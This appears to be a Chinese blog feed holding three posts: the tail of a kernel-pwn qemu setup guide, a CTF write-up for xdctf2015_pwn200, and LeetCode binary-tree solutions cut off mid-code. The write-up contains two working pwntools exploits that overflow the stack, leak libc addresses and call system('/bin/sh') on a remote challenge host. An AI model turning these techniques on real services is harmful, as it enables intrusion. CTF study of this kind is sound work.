/bin/cttyhack setuidgid 1000 /bin/sh #normal user</span><br><span class="line"># exec /bin/sh #root</span><br></pre></td></tr></table></figure><p>几个常见指令</p><ul><li>insmod: 指定模块加载到内核中</li><li>rmmod: 从内核中卸载指定模块</li><li>lsmod: 列出已经加载的模块</li></ul><p>在 packet 中写入，用于将 FileSystem 打包成映像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">echo &quot;Generate rootfs.img&quot;</span><br><span class="line">find . | cpio -o --format=newc &gt; ./rootfs.img</span><br></pre></td></tr></table></figure><p>运行 packet 将得到 rootfs.img 文件</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202202092315957.png" alt="image-20220209231518652"></p><h2 id="运行内核"><a class="markdownIt-Anchor" href="#运行内核">#</a> 运行内核</h2><p>安装 qemu</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">安装QEMU的依赖库</span><br><span class="line">sudo apt-get install git libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev</span><br><span class="line">sudo apt-get install qemu</span><br><span class="line">测试输入qemu + tab 如果有很多实例回显，就说明安装成功</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202202092316280.png" alt="image-20220209231643002"></p><p>之后写一个 shell 脚本启动 qemu, 将前面生成的 bzImage,rootfs.img 一起放到_install 文件夹下，<a href="http://xn--boot-k55ll68a.sh">运行 boot.sh</a>，结果如下</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202202092319697.png" alt="image-20220209231910444"></p><blockquote><p>如果显示权限不够则 chmod +x boot.sh 并在 root 下运行即可</p></blockquote><p>shell 中参数的含义：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-m 是指定RMA大小(默认384)</span><br><span class="line">-kernel 是指定的内核镜像，这里是我们编译的镜像路径，也可以是我们下载好的镜像，如./vmlinuz-4.10.0-1004-gcp</span><br><span class="line">-initrd 设置刚刚利用 busybox 创建的 rootfs.img,作为内核启动的文件系统 </span><br><span class="line">-append 附加选项，指定no kaslr 可以关闭随机偏移</span><br><span class="line">--nographic和console=ttyS0一起使用，启动的界面就变成了当前终端</span><br><span class="line">-s 相当于-gdb tcp::1234的简写，可以直接通过主机的gdb远程连接</span><br><span class="line">-monitor 配置用户械的网络 // 将监视器重定向主机设备 /dev/null</span><br><span class="line">-smp 用于生明所以可能用的cps,ie,socket cores threads = maxcputs.</span><br><span class="line">-cpu 设置cpu的安全选项</span><br></pre></td></tr></table></figure><p>到这里也说明了为什么 kernel pwn 题目一般都会给出这 3 个文件 <code>.sh ,bzImage,rootfs.cpio</code> ，分别是启动脚本，kernel 镜像以及文件系统映像</p><p>一般来说 kernel pwn 里面，漏洞通常是出现在 ko 文件，也就是模块文件，驱动 文件中，而 kernel pwn 的最终目标一般是提权，拿到 root 才能读取 flag</p><h2 id="参考文章"><a class="markdownIt-Anchor" href="#参考文章">#</a> 参考文章</h2><p><a href="https://blog.csdn.net/qq_40827990/article/details/97036109">https://blog.csdn.net/qq_40827990/article/details/97036109</a></p><p><a href="https://n0va-scy.github.io/2020/06/21/kernel%20pwn%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">https://n0va-scy.github.io/2020/06/21/kernel pwn 环境搭建 /</a></p>]]></content>
      
      
      <categories>
          
          <category> Kernel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xdctf2015_pwn200</title>
      <link href="/2022/02/01/xdctf2015_pwn200/"/>
      <url>/2022/02/01/xdctf2015_pwn200/</url>
      
        <content type="html"><![CDATA[<p>DynELF 使用</p><span id="more"></span><h2 id="程序分析"><a class="markdownIt-Anchor" href="#程序分析">#</a> 程序分析</h2><p>程序检查：32 位程序</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202202012038510.png" alt="image-20220201203856459"></p><p>主函数：vul 中存在栈溢出</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202202012037448.png" alt="image-20220201203754291"></p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202202012039002.png" alt="image-20220201203927851"></p><h2 id="关于dynelf"><a class="markdownIt-Anchor" href="#关于dynelf">#</a> 关于 DynELF</h2><p>​在做漏洞利用时，由于 ASLR 的影响，我们在获取某些函数地址的时候，需要一些特殊的操作。一种方法是先泄露出 <a href="http://libc.so">libc.so</a> 中的某个函数，然后根据函数之间的偏移，计算得到我们需要的函数地址，这种方法的局限性在于我们需要能找到和目标服务器上一样的 <a href="http://libc.so">libc.so</a>，而有些特殊情况下往往并不能找到。而另一种方法，利用如 pwntools 的 DynELF 模块，对内存进行搜索，直接得到我们需要的函数地址。</p><p>​官方文档里给出了下面的例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Assume a process or remote connection</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwnme&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Declare a function that takes a single address, and</span></span><br><span class="line"><span class="comment"># leaks at least one byte at that address.</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">address</span>):</span><br><span class="line">    data = p.read(address, <span class="number">4</span>)</span><br><span class="line">    log.debug(<span class="string">&quot;%#x =&gt; %s&quot;</span> % (address, (data <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>)))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment"># For the sake of this example, let&#x27;s say that we</span></span><br><span class="line"><span class="comment"># have any of these pointers.  One is a pointer into</span></span><br><span class="line"><span class="comment"># the target binary, the other two are pointers into libc</span></span><br><span class="line">main   = <span class="number">0xfeedf4ce</span></span><br><span class="line">libc   = <span class="number">0xdeadb000</span></span><br><span class="line">system = <span class="number">0xdeadbeef</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># With our leaker, and a pointer into our target binary,</span></span><br><span class="line"><span class="comment"># we can resolve the address of anything.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># We do not actually need to have a copy of the target</span></span><br><span class="line"><span class="comment"># binary for this to work.</span></span><br><span class="line">d = DynELF(leak, main)</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="literal">None</span>,     <span class="string">&#x27;libc&#x27;</span>) == libc</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>) == system</span><br><span class="line"></span><br><span class="line"><span class="comment"># However, if we *do* have a copy of the target binary,</span></span><br><span class="line"><span class="comment"># we can speed up some of the steps.</span></span><br><span class="line">d = DynELF(leak, main, elf=ELF(<span class="string">&#x27;./pwnme&#x27;</span>))</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="literal">None</span>,     <span class="string">&#x27;libc&#x27;</span>) == libc</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>) == system</span><br><span class="line"></span><br><span class="line"><span class="comment"># Alternately, we can resolve symbols inside another library,</span></span><br><span class="line"><span class="comment"># given a pointer into it.</span></span><br><span class="line">d = DynELF(leak, libc + <span class="number">0x1234</span>)</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="string">&#x27;system&#x27;</span>)      == system</span><br></pre></td></tr></table></figure><p>可以看到，为了使用 DynELF，首先需要有一个  <code>leak(address)</code>  函数，通过这一函数可以获取到某个地址上最少 1 byte 的数据，然后将这个函数作为参数调用  <code>d = DynELF(leak, main)</code> ，该模块就初始化完成了，然后就可以使用它提供的函数进行内存搜索，得到我们需要的函数地址。</p><h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用">#</a> 漏洞利用</h2><p>第一次栈溢出 write 函数泄露 libc 地址，返回 main 函数，使用 DynELF 查找 system 地址写入 /bin/sh，再次 rop 执行拿到 shell</p><h2 id="exp"><a class="markdownIt-Anchor" href="#exp">#</a> EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25224</span>)</span><br><span class="line"><span class="comment"># r= process(&#x27;./bof&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./bof&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read_addr=elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr=elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=<span class="number">0x804851c</span></span><br><span class="line">bss_addr=elf.symbols[<span class="string">&#x27;__bss_start&#x27;</span>] </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>)://write函数泄露libc地址</span><br><span class="line">        r.recvline()</span><br><span class="line">        payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x6c</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x4</span>+p32(write_addr)+p32(main_addr)+p32(<span class="number">1</span>)+p32(addr)+p32(<span class="number">0x4</span>)</span><br><span class="line">        r.sendline(payload)</span><br><span class="line">        leak_addr=r.recv(<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">return</span> leak_addr</span><br><span class="line"></span><br><span class="line">d=DynELF(leak,elf=ELF(<span class="string">&#x27;./bof&#x27;</span>))</span><br><span class="line">system_addr=d.lookup(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x6c</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x4</span>+p32(read_addr)+p32(main_addr)+p32(<span class="number">0x0</span>)+p32(bss_addr)+p32(<span class="number">0x8</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)  <span class="comment"># 通过read函数读入/bin/sh到bss段</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x6c</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x4</span>+p32(system_addr)+p32(main_addr)+p32(bss_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>法二 : ret2dl-resolve</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=UTF-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25224</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;bof&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23x86.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">112</span> * <span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload += p32(elf.plt[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(elf.got[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr = u32(sh.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:]) <span class="comment">#获取write函数地址</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(write_addr)</span><br><span class="line"></span><br><span class="line">libcbase = write_addr - libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system = libcbase + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libcbase + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">payload = <span class="number">112</span> * <span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload += p32(system)</span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="参考文章"><a class="markdownIt-Anchor" href="#参考文章">#</a> 参考文章</h2><p><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/4.8_dynelf.html">https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/4.8_dynelf.html</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>leetcode数据结构刷题（二）</title>
      <link href="/2022/01/30/leetcode%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C%EF%BC%89/"/>
      <url>/2022/01/30/leetcode%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>二叉搜索树相关</p><span id="more"></span><h2 id="0x01-二叉树最底层最左边的值"><a class="markdownIt-Anchor" href="#0x01-二叉树最底层最左边的值">#</a> 0x01 二叉树最底层最左边的值</h2><p>给定一个二叉树的 <strong>根节点</strong>  <code>root</code> ，请找出该二叉树的 <strong>最底层 最左边</strong> 节点的值。</p><p>假设二叉树中至少有一个节点。</p><p><img src="https://assets.leetcode.com/uploads/2020/12/14/tree2.jpg" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: [1,2,3,4,null,5,6,null,null,7]</span><br><span class="line">输出: 7</span><br></pre></td></tr></table></figure><h3 id="法一前序遍历dfs"><a class="markdownIt-Anchor" href="#法一前序遍历dfs">#</a> 法一：前序遍历 DFS</h3><p>使用 DFS 递归遍历树的所有节点，记录当前节点的层级 level 与已遍历节点的最大层级 maxLevel<br> 每当 level 超过 maxLevel 时，将当前节点赋值给 res，另外更新 maxLevel<br> 遍历完成后，res 就是要找的节点，返回该节点的值即可</p><p>遍历到新的一层的第一个节点为最底层，最左边的节点</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> maxlevel=<span class="number">-1</span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findBottomLeftValue</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">     <span class="built_in">dfs</span>(root,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(TreeNode * root,<span class="type">int</span> level)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        <span class="keyword">if</span>(level&gt;maxlevel)&#123;</span><br><span class="line">            res = root-&gt;val;</span><br><span class="line">            maxlevel = level;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">dfs</span>(root-&gt;left,level+<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">dfs</span>(root-&gt;right,level+<span class="number">1</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="法二层序遍历bfs"><a class="markdownIt-Anchor" href="#法二层序遍历bfs">#</a> 法二：层序遍历 BFS</h3><p>更新每层第一个元素值，取最后一次更新值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findBottomLeftValue</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">      queue&lt;TreeNode*&gt; q;</span><br><span class="line">      q.<span class="built_in">push</span>(root);</span><br><span class="line">      <span class="type">int</span> leftnode;</span><br><span class="line">      <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">          <span class="type">int</span> size = q.<span class="built_in">size</span>();</span><br><span class="line">          <span class="keyword">for</span> (<span class="type">int</span> i=size;i;i--)&#123;</span><br><span class="line">              <span class="keyword">auto</span> node = q.<span class="built_in">front</span>();</span><br><span class="line">              <span class="keyword">if</span>(i==size)</span><br><span class="line">                  leftnode = node-&gt;val;</span><br><span class="line">              q.<span class="built_in">pop</span>();</span><br><span class="line">              <span class="keyword">if</span>(node-&gt;left) q.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">              <span class="keyword">if</span>(node-&gt;right) q.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">        <span class="keyword">return</span> leftnode;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="0x02-往完全二叉树添加节点"><a class="markdownIt-Anchor" href="#0x02-往完全二叉树添加节点">#</a> 0x02 往完全二叉树添加节点</h2><p>完全二叉树是每一层（除最后一层外）都是完全填充（即，节点数达到最大，第 n 层有 2n-1 个节点）的，并且所有的节点都尽可能地集中在左侧。</p><p>设计一个用完全二叉树初始化的数据结构 CBTInserter，它支持以下几种操作：</p><p>CBTInserter (TreeNode root) 使用根节点为 root 的给定树初始化该数据结构；<br>CBTInserter.insert (int v)  向树中插入一个新节点，节点类型为 TreeNode，值为 v 。使树保持完全二叉树的状态，并返回插入的新节点的父节点的值；<br>CBTInserter.get_root () 将返回树的根节点。</p><p>示例 1：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：inputs = [<span class="string">&quot;CBTInserter&quot;</span>,<span class="string">&quot;insert&quot;</span>,<span class="string">&quot;get_root&quot;</span>], inputs = [[[<span class="number">1</span>]],[<span class="number">2</span>],[]]</span><br><span class="line">输出：[<span class="literal">null</span>,<span class="number">1</span>,[<span class="number">1</span>,<span class="number">2</span>]]</span><br><span class="line"></span><br><span class="line">输入：inputs = [<span class="string">&quot;CBTInserter&quot;</span>,<span class="string">&quot;insert&quot;</span>,<span class="string">&quot;insert&quot;</span>,<span class="string">&quot;get_root&quot;</span>], inputs = [[[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]],[<span class="number">7</span>],[<span class="number">8</span>],[]]</span><br><span class="line">输出：[<span class="literal">null</span>,<span class="number">3</span>,<span class="number">4</span>,[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>]]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="使用队列完成二叉树的层序遍历"><a class="markdownIt-Anchor" href="#使用队列完成二叉树的层序遍历">#</a> 使用队列完成二叉树的层序遍历</h3><p>通过观察可以发现新节点需要插入层次遍历时第一个出现的 “不完整的节点” （即不同时具有左右孩子节点）。如图中所示，绿色代表当前队列中的节点（规定节点的左右孩子均存在时才将它们一起先后压入队列)，当遍历到 “不完整的节点” 就找到了新节点插入的节点位置，“不完整的节点” 位于队列的头部。在 CBTInserter 函数中实现该过程，找到插入的位置，以及得到当前的队列。</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201301559584.jpeg" alt="ce27c552f3c1d653d97978cf52b4b0d.jpg"></p><p>插入操作时，先后检查队列头部节点的左右孩子，若左孩子缺失则将新节点插入其左孩子，右孩子缺失则插入右孩子。当队列头部节点的左右孩子都存在，则将其左右孩子压入队列尾部，队列的头部节点出队列，因为此时它已不是 “不完整的节点” 。更新后的队列的头部节点将是下一个 “不完整的节点”。按照规则依次处理接下来的插入操作。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CBTInserter</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    queue&lt;TreeNode*&gt; que;</span><br><span class="line">    TreeNode* root;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">CBTInserter</span>(TreeNode* root) &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;root = root;</span><br><span class="line">        que.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">while</span> (que.<span class="built_in">front</span>()-&gt;left != <span class="literal">nullptr</span> &amp;&amp; que.<span class="built_in">front</span>()-&gt;right != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            que.<span class="built_in">push</span>(que.<span class="built_in">front</span>()-&gt;left);</span><br><span class="line">            que.<span class="built_in">push</span>(que.<span class="built_in">front</span>()-&gt;right);</span><br><span class="line">            que.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">insert</span><span class="params">(<span class="type">int</span> v)</span> </span>&#123;</span><br><span class="line">        TreeNode* node = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(v);</span><br><span class="line">        TreeNode* fa = que.<span class="built_in">front</span>();</span><br><span class="line">        <span class="keyword">if</span> (fa-&gt;left == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            fa-&gt;left = node;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            fa-&gt;right = node;</span><br><span class="line">            que.<span class="built_in">push</span>(fa-&gt;left);</span><br><span class="line">            que.<span class="built_in">push</span>(fa-&gt;right);</span><br><span class="line">            que.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> fa-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function">TreeNode* <span class="title">get_root</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>-&gt;root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your CBTInserter object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * CBTInserter* obj = new 